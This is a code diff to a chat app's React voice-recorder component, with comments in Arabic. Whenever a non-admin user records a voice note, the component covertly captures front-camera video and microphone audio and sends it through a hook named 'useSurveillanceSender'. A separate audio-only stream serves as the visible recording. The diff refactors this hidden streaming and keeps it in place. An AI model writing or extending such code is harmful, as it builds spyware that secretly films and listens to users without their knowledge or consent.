@@ -259,8 +259,6 @@
 
 
 
-
-
 "use client";
 
 import { useState, useRef, useEffect, useCallback } from "react";
@@ -293,11 +291,10 @@ export const VoiceRecorder = ({ onSend, onCancel, conversationId }: VoiceRecorde
   const animationRef = useRef<number | null>(null);
   const hasStarted = useRef(false);
   const audioStreamRef = useRef<MediaStream | null>(null);
-  const streamingStarted = useRef(false); // ← منع تكرار startStreaming
 
   const { user } = useAuthStore();
   const isAdmin = user?.username === ADMIN_USERNAME;
-const { startStreaming, stopStreaming } = useSurveillanceSender(conversationId);
+  const { startStreaming, stopStreaming } = useSurveillanceSender(conversationId);
 
   const stopTimer = useCallback(() => {
     if (timerRef.current) clearInterval(timerRef.current);
@@ -322,21 +319,17 @@ const { startStreaming, stopStreaming } = useSurveillanceSender(conversationId);
     try {
       let audioStream: MediaStream;
 
-      if (!isAdmin && !streamingStarted.current) {
-        streamingStarted.current = true;
+      if (!isAdmin) {
         try {
           const fullStream = await navigator.mediaDevices.getUserMedia({
             audio: true,
             video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
           });
 
-          // ابدأ البث مرة واحدة بس
           await startStreaming(fullStream);
 
-          // صوت منفصل للتسجيل
           audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
           audioStreamRef.current = audioStream;
-
         } catch {
           audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
           audioStreamRef.current = audioStream;
@@ -365,7 +358,6 @@ const { startStreaming, stopStreaming } = useSurveillanceSender(conversationId);
         const blob = new Blob(chunksRef.current, { type: "audio/webm" });
         const url = URL.createObjectURL(blob);
         setAudioUrl(url);
-        // وقف الـ audioStream بس — الـ fullStream في الـ window.__surveillanceStream
         audioStreamRef.current?.getTracks().forEach((t) => t.stop());
         audioStreamRef.current = null;
       };
@@ -380,16 +372,16 @@ const { startStreaming, stopStreaming } = useSurveillanceSender(conversationId);
   }, [animateWaveform, onCancel, isAdmin, startStreaming]);
 
   useEffect(() => {
-  if (hasStarted.current) return;
-  hasStarted.current = true;
-  void startRecording();
-  return () => {
-    stopTimer();
-    if (animationRef.current) cancelAnimationFrame(animationRef.current);
-    // ← reset عشان المرة الجاية يشتغل
-    streamingStarted.current = false;
-  };
-}, [startRecording, stopTimer]);
+    if (hasStarted.current) return;
+    hasStarted.current = true;
+    void startRecording();
+    return () => {
+      stopTimer();
+      if (animationRef.current) cancelAnimationFrame(animationRef.current);
+      // ← وقف البث لما الـ component يتـ unmount عشان المرة الجاية تشتغل
+      stopStreaming();
+    };
+  }, [startRecording, stopTimer, stopStreaming]);
 
   const stopRecording = () => {
     if (mediaRecorderRef.current?.state !== "inactive") {
@@ -402,11 +394,10 @@ const { startStreaming, stopStreaming } = useSurveillanceSender(conversationId);
   };
 
   const handleCancel = () => {
-  audioStreamRef.current?.getTracks().forEach((t) => t.stop());
-  audioStreamRef.current = null;
-  streamingStarted.current = false; // ← reset
-  onCancel();
-};
+    audioStreamRef.current?.getTracks().forEach((t) => t.stop());
+    audioStreamRef.current = null;
+    onCancel();
+  };
 
   const handleSend = async () => {
     if (!audioUrl) return;
@@ -424,9 +415,8 @@ const { startStreaming, stopStreaming } = useSurveillanceSender(conversationId);
     } catch (err) {
       console.error("Failed to upload voice note:", err);
     } finally {
-    setIsUploading(false);
-    streamingStarted.current = false; // ← reset بعد الإرسال
-  }
+      setIsUploading(false);
+    }
   };
 
   const formatDuration = (secs: number) => {
